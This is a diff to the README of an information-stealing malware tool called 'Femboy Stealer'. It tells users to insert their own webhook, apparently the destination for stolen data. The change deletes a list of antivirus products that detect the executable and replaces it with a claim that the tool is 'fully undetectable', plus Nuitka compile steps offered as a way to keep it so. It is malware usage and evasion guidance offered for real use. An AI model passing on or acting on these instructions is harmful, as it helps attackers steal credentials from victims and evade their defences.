@@ -5,15 +5,13 @@
 ---
 * You need to replace the webhook in the file
 
-It will be updated to try to bypass some of them
-Without the exe nothing detect Femboy Stealer
-You can make it into an exe, it is detected by all these 5 AV
+The program is FUD in Python and will be FUD if you use Nuitka to compile it
 
-Elastic
-Kaspersky
-McAfee-GW-Edition
-SecureAge
-ZoneAlarm by Check Point
+Pip install nuitka
+
+```py
+python -m nuitka --follow-imports main.py
+```
 -----
 
 
